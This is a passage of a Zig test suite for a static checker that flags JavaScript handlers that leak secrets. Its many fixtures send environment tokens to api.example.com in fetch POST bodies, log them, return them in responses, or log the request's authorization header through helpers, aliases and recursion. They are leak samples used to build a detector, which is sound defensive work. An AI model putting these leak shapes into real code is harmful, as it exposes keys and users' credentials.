        .{ .name = "nested in a ternary arm", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const r = req.method === "GET" ? fetch("https://api.example.com/x", { method: "POST", body: t }) : 0;
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in a call argument", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  logInfo("sent", { status: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an assignment statement", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  let r = 0;
            \\  r = fetch("https://api.example.com/x", { method: "POST", body: t });
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an if condition", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  if (fetch("https://api.example.com/x", { method: "POST", body: t }).ok) return Response.json({ ok: 1 });
            \\  return Response.json({ ok: 0 });
            \\}
        },
        .{ .name = "nested in a callee expression", .source = head ++
            \\function send(x) {
            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: x })];
            \\  return 1;
            \\}
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const n = send(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
    };
    for (leaking) |case| {
        errdefer std.debug.print("case still proven: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(!properties.no_secret_leakage);
    }

    // Controls: the same shapes with a literal where the secret was.
    const clean = [_]Case{
        .{ .name = "return path", .source = head ++
            \\function send(x) { return fetch("https://api.example.com/x", { method: "POST", body: x }); }
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const r = send("hello");
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const inner = (x) => logInfo(x, { n: 1 });
            \\  const n = inner("hello");
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: "hello" })];
            \\  return Response.json({ ok: 1 });
            \\}
        },
    };
    for (clean) |case| {
        errdefer std.debug.print("case wrongly refused: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(properties.no_secret_leakage);
    }
}

test "FlowChecker reports a nested sink once, with the same text as the statement form (F5)" {
    var buf: [512]u8 = undefined;
    const statement =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const t = env("API_TOKEN") ?? "";
        \\  fetch("https://api.example.com/x", { method: "POST", body: t });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const nested =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const t = env("API_TOKEN") ?? "";
        \\  return Response.json({ s: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
        \\}
    ;
    const statement_report = try runFlowDiagnostics(std.testing.allocator, statement, .secret_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 1), statement_report.count);
    var nested_buf: [512]u8 = undefined;
    const nested_report = try runFlowDiagnostics(std.testing.allocator, nested, .secret_in_egress_body, &nested_buf);
    try std.testing.expectEqual(@as(usize, 1), nested_report.count);
    try std.testing.expectEqualStrings(statement_report.help, nested_report.help);
}

test "FlowChecker labels credential reads on any binding that carries the request (F6)" {
    const Case = struct { name: []const u8, source: []const u8 };

    // The direct form: the handler's own request parameter. Refused today.
    const direct =
        \\function handler(req) {
        \\  console.log(req.headers["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const direct_properties = try runFlowProperties(std.testing.allocator, direct);
    try std.testing.expect(!direct_properties.no_credential_leakage);

    // The routed forms: the same read through a binding other than the
    // handler's parameter. Each must lose `no_credential_leakage`.
    const leaking = [_]Case{
        .{ .name = "parameter bound to the request", .source =
        \\function leak(r) {
        \\  console.log(r.headers["authorization"]);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = leak(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "dot read in a helper that responds", .source =
        \\function show(r) { return Response.json({ k: r.headers.authorization }); }
        \\function handler(req) { return show(req); }
        },
        .{ .name = "headers.get in a helper", .source =
        \\function leak(r) {
        \\  console.log(r.headers.get("authorization"));
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = leak(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "request passed through two helpers", .source =
        \\function leak(r) {
        \\  console.log(r.headers["authorization"]);
        \\  return 1;
        \\}
        \\function outer(q) { return leak(q); }
        \\function handler(req) {
        \\  const n = outer(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "const alias of the request", .source =
        \\function handler(req) {
        \\  const r = req;
        \\  console.log(r.headers["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "const alias of the headers", .source =
        \\function handler(req) {
        \\  const h = req.headers;
        \\  console.log(h["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "headers passed to a helper", .source =
        \\function leak(h) {
        \\  console.log(h.authorization);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = leak(req.headers);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "callback receives the credential", .source =
        \\function apply(r, f) {
        \\  const t = r.headers["authorization"] ?? "";
        \\  return f(t);
        \\}
        \\function handler(req) {
        \\  const n = apply(req, (x) => { console.log(x); return 1; });
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "recursion", .source =
        \\function rec(r, x, k) {
        \\  if (k <= 0) { return Response.json({ k: x }); }
        \\  const t = r.headers["authorization"] ?? "";
        \\  return rec(r, t, k - 1);
        \\}
        \\function handler(req) { return rec(req, "hello", 1); }
        },
    };
    for (leaking) |case| {
        errdefer std.debug.print("case still proven: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(!properties.no_credential_leakage);
    }

    // Controls: a header read that is not the credential, and an object that
    // happens to have a `headers` field but is not the request, stay clean.
    const clean = [_]Case{
        .{ .name = "another header of the request", .source =
        \\function show(r) { console.log(r.headers["x-trace-id"]); return 1; }
        \\function handler(req) {
        \\  const n = show(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "an object with a headers field", .source =
        \\function show(o) { console.log(o.headers["authorization"]); return 1; }
        \\function handler(req) {
        \\  const n = show({ headers: { authorization: "public" } });
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "an alias of such an object", .source =
        \\function handler(req) {
        \\  const o = { headers: { authorization: "public" } };
        \\  const r = o;
        \\  console.log(r.headers["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "a helper called with something other than the request", .source =
        \\function show(r) { console.log(r.headers["authorization"]); return 1; }
        \\function handler(req) {
        \\  const n = show({ headers: { authorization: "public" } });
        \\  return Response.json({ ok: 1 });
        \\}
        },
    };
    for (clean) |case| {
        errdefer std.debug.print("case wrongly refused: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(properties.no_credential_leakage);
    }
}

test "FlowChecker walks a function passed by name to an array method" {
    // A callback literal is walked with the receiver's labels already; the
    // same callback passed by name must be too, nested or top-level.
    const top_level =
        \\import { env } from "zttp:env";
        \\function leak(s) {
        \\  console.log(s);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = [env("SECRET_KEY")].map(leak);
        \\  return Response.json({ n: n.length });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, top_level)).no_secret_leakage);

    const nested =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  function leak(s) {
        \\    console.log(s);
        \\    return 1;
        \\  }
        \\  const n = [env("SECRET_KEY")].map(leak);
        \\  return Response.json({ n: n.length });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, nested)).no_secret_leakage);

    // The control: a clean receiver keeps the property.
    const clean =
        \\function leak(s) {
        \\  console.log(s);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = ["a"].map(leak);
        \\  return Response.json({ n: n.length });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);
}

test "FlowChecker re-walks a callee without the labels an earlier call bound" {
    // `id` is walked first with a secret, then with a literal. Its `y` must
    // not keep the secret into the second walk, or `shout` logs a clean value
    // as a secret.
    const source =
        \\import { env } from "zttp:env";
        \\function id(x) {
        \\  const y = x;
        \\  return y;
        \\}
        \\function shout(x) {
        \\  console.log(x);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const a = id(env("SECRET_KEY"));
        \\  const b = id("hello");
        \\  const n = shout(b);
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, source)).no_secret_leakage);

    // The control: the secret through the same path is still refused.
    const leaking =
        \\import { env } from "zttp:env";
        \\function id(x) {
        \\  const y = x;
        \\  return y;
        \\}
        \\function shout(x) {
        \\  console.log(x);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const b = id("hello");
        \\  const a = id(env("SECRET_KEY"));
        \\  const n = shout(a);
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, leaking)).no_secret_leakage);
}

test "FlowChecker carries labels on a module-level declaration" {
    var buf: [512]u8 = undefined;

    // The handler returns a secret held by a module-level constant.
    const returned =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\function handler(req) {
        \\  return Response.json({ k: token });
        \\}
    ;
    const returned_report = try runFlowDiagnostics(std.testing.allocator, returned, .secret_in_response, &buf);
    try std.testing.expectEqual(@as(usize, 1), returned_report.count);
    try std.testing.expect(!returned_report.properties.no_secret_leakage);

    // The same constant declared after the handler is read the same way.
    const declared_later =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  return Response.json({ k: token });
        \\}
        \\const token = env("SECRET_KEY") ?? "";
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, declared_later)).no_secret_leakage);

    // A helper logs the constant.
    const logged =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\function audit() {
        \\  console.log(token);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = audit();
        \\  return Response.json({ n: n });
        \\}
    ;
    const logged_report = try runFlowDiagnostics(std.testing.allocator, logged, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), logged_report.count);
    try std.testing.expect(!logged_report.properties.no_secret_leakage);

    // A module-level initializer is itself a sink at load time.
    const initializer_sink =
        \\import { env } from "zttp:env";
        \\const logged = console.log(env("SECRET_KEY"));
        \\function handler(req) {
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, initializer_sink)).no_secret_leakage);

    // A secret reached through a second module-level constant.
    const chained =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\const header = token;
        \\function handler(req) {
        \\  return Response.json({ k: header });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, chained)).no_secret_leakage);
}

test "FlowChecker keeps a property for a module-level clean constant or function" {
    // Control: a module-level constant that holds no secret keeps the property.
    const clean =
        \\import { env } from "zttp:env";
        \\const region = env("REGION") ?? "";
        \\function handler(req) {
        \\  return Response.json({ region: region });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);

    // A module-level function named in a route table is a function value, not
    // a datum without a label: the table and the route keep the property.
    const routed =
        \\import { routerMatch } from "zttp:router";
        \\function show(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /show": show };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, routed)).no_secret_leakage);

    // A function declaration or a function-valued constant, read as a value,
    // holds no datum that lacks a label.
    const function_valued =
        \\function twice(n) { return n + n; }
        \\const thrice = (n) => n + n + n;
        \\function handler(req) {
        \\  const fns = [twice, thrice];
        \\  return Response.json({ n: fns.length });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, function_valued)).no_secret_leakage);

    // An imported name read as a value likewise carries no unlabeled datum.
    const imported_value =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const fns = [env];
        \\  return Response.json({ n: fns.length });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, imported_value)).no_secret_leakage);

    // A let without an initializer starts empty.
    const uninitialized =
        \\let count;
        \\function handler(req) {
        \\  return Response.json({ n: count });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, uninitialized)).no_secret_leakage);
}

test "FlowChecker keeps a property for a captured value that holds no secret" {
    // Control: the captured value is clean.
    const clean =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const region = env("REGION") ?? "";
        \\  const inner = () => {
        \\    console.log(region);
        \\    return Response.json({ r: region });
        \\  };
        \\  return inner();
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);

    // Name collision: the helper logs its own clean x, and the handler's secret
    // x is only measured. A union by name would refuse this.
    const collision =
        \\import { env } from "zttp:env";
        \\function helperA() {
        \\  const x = "clean";
        \\  const inner = () => {
        \\    console.log(x);
        \\    return 1;
        \\  };
        \\  return inner();
        \\}
        \\function handler(req) {
        \\  const x = env("SECRET_KEY") ?? "";
        \\  const n = helperA();
        \\  const m = x.length;
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, collision)).no_secret_leakage);

    // Shadowing: the closure captures the function-level x, not the x of a
    // block that has ended.
    const shadowed =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  if (req.method === "GET") {
        \\    const x = env("SECRET_KEY") ?? "";
        \\    const m = x.length;
        \\  }
        \\  const x = "clean";
        \\  const show = () => {
        \\    return Response.json({ k: x });
        \\  };
        \\  return show();
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, shadowed)).no_secret_leakage);

    // The closure is declared where a parameter of the same name is clean.
    const param_clean =
        \\import { env } from "zttp:env";
        \\function show(token) {
        \\  const inner = () => {
        \\    return Response.json({ k: token });
        \\  };
        \\  return inner();
        \\}
        \\function handler(req) {
        \\  const token = env("SECRET_KEY") ?? "";
        \\  const m = token.length;
        \\  return show("clean");
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, param_clean)).no_secret_leakage);
}

test "FlowChecker carries an operand's labels through a unary operator" {
    // `getOptValue` on a unary node reads the operator code, not the operand,
    // so the operand's labels were dropped (and a module-level `typeof n`
    // walked an unrelated node until the stack ran out).
    const negated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const t = !(env("SECRET_KEY") ?? "");
        \\  return Response.json({ t: t });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, negated)).no_secret_leakage);

    const typed_at_module_level =
        \\const n = 1;
        \\const same = typeof n === "number";
        \\function handler(req) {
        \\  return Response.json({ same: same });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, typed_at_module_level)).no_secret_leakage);
}

test "FlowChecker fails closed on a discarded method of a record a function returned" {
    // Bound to the response, the result carries the argument's secret, so the
    // leak is refused there already.
    const bound =
        \\import { env } from "zttp:env";
        \\function makeOps() {
        \\  return { run: (s) => { console.log(s); return 1; } };
        \\}
        \\function handler(req) {
        \\  const ops = makeOps();
        \\  const n = ops.run(env("SECRET_KEY"));
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, bound)).no_secret_leakage);

    // Discarded, the closure's log is the only leak, and the walk cannot
    // resolve `run` through the returned record, so the property is cleared.
    const discarded =
        \\import { env } from "zttp:env";
        \\function makeOps() {
        \\  return { run: (s) => { console.log(s); return 1; } };
        \\}
        \\function handler(req) {
        \\  const ops = makeOps();
        \\  ops.run(env("SECRET_KEY"));
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, discarded)).no_secret_leakage);

    // A builtin method name on a value of unknown type keeps the property.
    const builtin =
        \\function handler(req) {
        \\  const parts = req.url.split("/");
        \\  parts.join("-");
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, builtin)).no_secret_leakage);
}

test "FlowChecker fails closed on a discarded call beyond the summary depth cap" {
    var buf: [512]u8 = undefined;
    // Nine helpers: the ninth logs, one past `max_summary_depth`. The result is
    // discarded, so only the property can record that the walk did not reach
    // the log.
    const leaking =
        \\import { env } from "zttp:env";
        \\function h9(x) { console.log(x); return 1; }
        \\function h8(x) { return h9(x); }
        \\function h7(x) { return h8(x); }
        \\function h6(x) { return h7(x); }
        \\function h5(x) { return h6(x); }
        \\function h4(x) { return h5(x); }
        \\function h3(x) { return h4(x); }
        \\function h2(x) { return h3(x); }
        \\function h1(x) { return h2(x); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = h1(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same chain, one call shorter, is walked in full and the log
    // is refused, so the cap and not the chain decides the unproven verdict.
    const short =
        \\import { env } from "zttp:env";
        \\function h2(x) { console.log(x); return 1; }
        \\function h1(x) { return h2(x); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = h1(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const short_report = try runFlowDiagnostics(std.testing.allocator, short, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), short_report.count);
    try std.testing.expect(!short_report.properties.no_secret_leakage);
}

test "FlowChecker fails closed on a discarded call past the parameter cap" {
    var buf: [512]u8 = undefined;
    const leaking =
        \\import { env } from "zttp:env";
        \\function helper(x, p2, p3, p4, p5, p6, p7, p8, p9) { console.log(x); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = helper(s, 2, 3, 4, 5, 6, 7, 8, 9);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker keeps the properties for a discarded call to a known global" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const s = env("PUBLIC_NAME");
        \\  parseInt("5");
        \\  Number(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), report.count);
    try std.testing.expect(report.properties.no_secret_leakage);
    try std.testing.expect(report.properties.no_credential_leakage);
    try std.testing.expect(report.properties.input_validated);
    try std.testing.expect(report.properties.pii_contained);
    try std.testing.expect(report.properties.injection_safe);
    try std.testing.expect(report.properties.deterministic);
}

test "FlowChecker resolves a function passed as a parameter to the passed closure" {
    var buf: [512]u8 = undefined;
    const apply =
        \\import { env } from "zttp:env";
        \\function apply(f, t) { return f(t); }
    ;

    // The closure logs what it receives and the secret reaches it through the
    // callee's own parameter: a refusal, not just an unproven property.
    const leaking = apply ++
        \\
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = apply((x) => { console.log(x); return 1; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: a clean argument through a logging closure reports nothing and
    // keeps the property, so the call resolved instead of failing closed.
    const clean_arg = apply ++
        \\
        \\function handler(req) {
        \\  const n = apply((x) => { console.log(x); return 1; }, "ok");
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_arg_report = try runFlowDiagnostics(std.testing.allocator, clean_arg, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_arg_report.count);
    try std.testing.expect(clean_arg_report.properties.no_secret_leakage);
    try std.testing.expect(clean_arg_report.properties.deterministic);

    // Control: a secret through a closure that does not sink it.
    const quiet = apply ++
        \\
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = apply((x) => { return 1; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const quiet_report = try runFlowDiagnostics(std.testing.allocator, quiet, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), quiet_report.count);
    try std.testing.expect(quiet_report.properties.no_secret_leakage);
}

test "FlowChecker does not carry a passed function from one call site to the next" {
    var buf: [512]u8 = undefined;
    // The first call passes the logging closure with a clean value. The second
    // passes a closure that does not log, with the secret. If the first
    // binding survived, the second call would log the secret.
    const log_then_quiet =
        \\import { env } from "zttp:env";
        \\function apply(f, t) { return f(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n1 = apply((x) => { console.log(x); return 1; }, "ok");
        \\  const n2 = apply((y) => { return 2; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const first = try runFlowDiagnostics(std.testing.allocator, log_then_quiet, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), first.count);
    try std.testing.expect(first.properties.no_secret_leakage);

    // The reverse order: the quiet closure first, the logging one second with
    // the secret. The second call must still be refused.
    const quiet_then_log =
        \\import { env } from "zttp:env";
        \\function apply(f, t) { return f(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n1 = apply((y) => { return 2; }, "ok");
        \\  const n2 = apply((x) => { console.log(x); return 1; }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const second = try runFlowDiagnostics(std.testing.allocator, quiet_then_log, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), second.count);
    try std.testing.expect(!second.properties.no_secret_leakage);
}

test "FlowChecker fails closed on a call through a parameter nothing bound" {
    var buf: [512]u8 = undefined;
    // `go` is the handler's own parameter-like value from outside the file, so
    // the call cannot be resolved and its sinks cannot be walked.
    const source =
        \\import { env } from "zttp:env";
        \\function run(f, t) { f(t); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = run(req.hook, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker resolves a method of a record passed as a parameter" {
    var buf: [512]u8 = undefined;
    // A record literal written at the call site: its method is the one `o.run`
    // calls, and the secret reaches that method's log.
    const leaking =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { return o.run(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = useOps({ run: (x) => { console.log(x); return 1; } }, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same record with a clean argument reports nothing.
    const clean =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { return o.run(t); }
        \\function handler(req) {
        \\  const n = useOps({ run: (x) => { console.log(x); return 1; } }, "ok");
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);

    // A record bound to a name that the callee calls a method on is not a
    // stable resolution (`callKeepsArgumentLocal` refuses it), so the method
    // stays unresolved and the property is unproven rather than refused.
    const named =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { return o.run(t); }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const ops = { run: (x) => { console.log(x); return 1; } };
        \\  const n = useOps(ops, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const named_report = try runFlowDiagnostics(std.testing.allocator, named, .secret_in_log, &buf);
    try std.testing.expect(!named_report.properties.no_secret_leakage);

    // A record parameter that no call site bound.
    const unbound =
        \\import { env } from "zttp:env";
        \\function useOps(o, t) { o.run(t); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const n = useOps(req.ops, s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const unbound_report = try runFlowDiagnostics(std.testing.allocator, unbound, .secret_in_log, &buf);
    try std.testing.expect(!unbound_report.properties.no_secret_leakage);
}

test "FlowChecker walks a helper that is called as a bare statement" {
    var buf: [512]u8 = undefined;
    // The call discards its value. Only the label inference enters a called
    // body, so the statement path has to run it for the log to be seen.
    const leaking =
        \\import { env } from "zttp:env";
        \\function audit(t) { console.log(t); return 1; }
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  audit(s);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same helper called with a clean literal.
    const clean =
        \\import { env } from "zttp:env";
        \\function audit(t) { console.log(t); return 1; }
        \\function handler(req) {
        \\  audit("ok");
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);
    try std.testing.expect(clean_report.properties.deterministic);
}

test "FlowChecker widens a recursive summary until its labels stop growing" {
    var buf: [512]u8 = undefined;
    // The outer call passes a clean string. The secret enters only in the
    // recursive call's argument, and the base case logs it.
    const leaking =
        \\import { env } from "zttp:env";
        \\function rec(x, k) {
        \\  if (k <= 0) {
        \\    console.log(x);
        \\    return 1;
        \\  }
        \\  const t = env("SECRET_KEY");
        \\  return rec(t, k - 1);
        \\}
        \\function handler(req) {
        \\  const n = rec("hello", 1);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // Control: the same recursion with a clean argument throughout.
    const clean =
        \\import { env } from "zttp:env";
        \\function rec(x, k) {
        \\  if (k <= 0) {
        \\    console.log(x);
        \\    return 1;
        \\  }
        \\  const t = "fine";
        \\  return rec(t, k - 1);
        \\}
        \\function handler(req) {
        \\  const n = rec("hello", 1);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);
    try std.testing.expect(clean_report.properties.deterministic);
}

test "FlowChecker widens a mutual recursion through the frame that is active" {
    var buf: [512]u8 = undefined;
    // `ping` calls `pong`, which calls `ping` with the secret. The hit lands on
    // the outer `ping` frame, so the widening must come back to that frame.
    const source =
        \\import { env } from "zttp:env";
        \\function ping(x, k) {
        \\  if (k <= 0) {
        \\    console.log(x);
        \\    return 1;
        \\  }
        \\  return pong(x, k - 1);
        \\}
        \\function pong(y, k) {
        \\  const t = env("SECRET_KEY");
        \\  return ping(t, k - 1);
        \\}
        \\function handler(req) {
        \\  const n = ping("hello", 2);
        \\  return Response.json({ ok: true });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker keeps a routed sink's single report and actual callsite help" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function leak(req) {
        \\  console.log(env("SECRET_KEY"));
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = { "GET /leak": leak };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
    try std.testing.expectEqualStrings("env vars with sensitive names must not be logged (reached through the call at line 11, column 23)", report.help);
}

test "FlowChecker reports one helper reached from two call sites once per kind" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { env } from "zttp:env";
        \\function note(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const a = note(env("SECRET_KEY"));
        \\  const b = note(env("SECRET_KEY"));
        \\  const c = note(req.headers.authorization);
        \\  return Response.json({ n: a + b + c });
        \\}
    ;
    const secret = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_log, &buf);
